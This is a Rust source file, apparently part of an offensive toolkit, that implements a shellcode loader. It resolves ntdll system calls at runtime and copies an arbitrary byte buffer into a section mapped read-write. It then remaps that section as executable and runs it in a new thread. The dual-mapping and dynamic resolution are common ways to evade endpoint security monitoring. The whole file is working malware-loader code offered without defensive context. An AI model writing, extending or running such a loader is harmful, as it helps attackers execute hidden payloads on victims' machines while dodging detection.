use std::ffi::c_void;
use std::ptr;
use crate::ntapi::*;

pub fn run(sc: &[u8]) -> bool {
    unsafe {
        let create_section: NtCreateSectionFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtCreateSection\0"));
        let map_view: NtMapViewOfSectionFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtMapViewOfSection\0"));
        let thread: NtCreateThreadExFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtCreateThreadEx\0"));
        let wait: NtWaitForSingleObjectFn = std::mem::transmute(resolve(b"ntdll.dll\0", b"NtWaitForSingleObject\0"));

        let sec_size: i64 = sc.len() as i64;
        let mut h_section: Handle = 0;

        let status = create_section(&mut h_section, SECTION_ALL_ACCESS, ptr::null(), &sec_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
        if !nt_success(status) {
            return false;
        }

        let mut rw_base: *mut c_void = ptr::null_mut();
        let mut view_size: usize = 0;
        let status = map_view(h_section, CURRENT_PROCESS, &mut rw_base, 0, 0, ptr::null(), &mut view_size, 1, 0, PAGE_READWRITE);
        if !nt_success(status) {
            CloseHandle(h_section);
            return false;
        }

        ptr::copy_nonoverlapping(sc.as_ptr(), rw_base as *mut u8, sc.len());

        let mut rx_base: *mut c_void = ptr::null_mut();
        view_size = 0;
        let status = map_view(h_section, CURRENT_PROCESS, &mut rx_base, 0, 0, ptr::null(), &mut view_size, 1, 0, PAGE_EXECUTE_READ);
        if !nt_success(status) {
            CloseHandle(h_section);
            return false;
        }

        let mut h_thread: Handle = 0;
        let status = thread(&mut h_thread, THREAD_ALL_ACCESS, ptr::null(), CURRENT_PROCESS, rx_base, ptr::null(), 0, 0, 0, 0, ptr::null());
        if !nt_success(status) {
            CloseHandle(h_section);
            return false;
        }

        wait(h_thread, 0, ptr::null());
        CloseHandle(h_thread);
        CloseHandle(h_section);
        true
    }
}
